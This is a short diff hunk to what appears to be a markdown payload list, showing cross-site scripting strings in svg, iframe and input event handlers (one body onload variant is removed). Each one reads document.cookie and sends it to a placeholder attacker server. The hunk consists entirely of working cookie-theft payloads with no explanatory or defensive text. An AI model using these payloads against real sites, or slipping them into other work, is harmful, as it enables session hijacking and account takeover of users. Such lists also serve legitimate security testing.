@@ -8,8 +8,6 @@
 
 ```<svg onload="new Image().src='https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie)">```
 
-```<body onload="new Image().src='https://attacker-controlled-server/?data='+encodeURIComponent(document.cookie)">```
-
 ```<iframe onload="new Image().src='https://attacker-controlled-server/?data='+encodeURIComponent(document.cookie)">```
 
 ```<input autofocus onfocus="new Image().src='https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie)">```
